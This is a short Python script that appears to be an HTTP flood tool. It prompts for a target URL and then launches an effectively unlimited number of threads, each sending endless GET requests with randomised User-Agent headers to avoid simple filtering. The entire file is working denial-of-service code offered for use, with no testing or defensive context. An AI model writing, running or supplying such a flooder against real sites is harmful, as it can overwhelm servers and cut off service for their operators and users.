import requests, threading, time
from fake_useragent import UserAgent
from colorama import Fore

count = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
url = input("URL --> ")

def Gen():
	while True:
		ua = UserAgent()
		agent = ua.random
		headers = {
    "User-Agent":
    agent
}
		requests.get(url, headers=headers)
		print(f"Request Sent as {agent}")

if __name__ == '__main__':
    for i in range(count):
        threading.Thread(target=Gen).start()
